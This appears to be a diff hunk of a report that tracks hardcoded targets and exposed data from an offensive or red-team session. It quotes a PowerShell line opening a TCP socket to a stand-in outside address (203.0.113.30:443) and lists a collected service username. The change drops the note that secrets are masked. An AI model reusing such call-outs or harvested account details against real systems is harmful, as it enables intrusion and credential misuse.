@@ -223,7 +223,7 @@ Targeted   (hardcoded values: prior means no earlier output holds it, discovered
     [x] 203.0.113.30  NetworkSocket
         what  NetworkSocket: $tcp = New-Object System.Net.Sockets.TcpClient("203.0.113.30", 443) (20261020_102500_step06_pinvoke.ps1:10)
 
-Exposure   (collected: first seen in an output; used: first seen in a script; a secret is masked)
+Exposure   (collected: first seen in an output; used: first seen in a script)
   Usernames (1)
     [!] svc_build  collected  recon_20261020_100030.txt:2
   IP addresses (3)
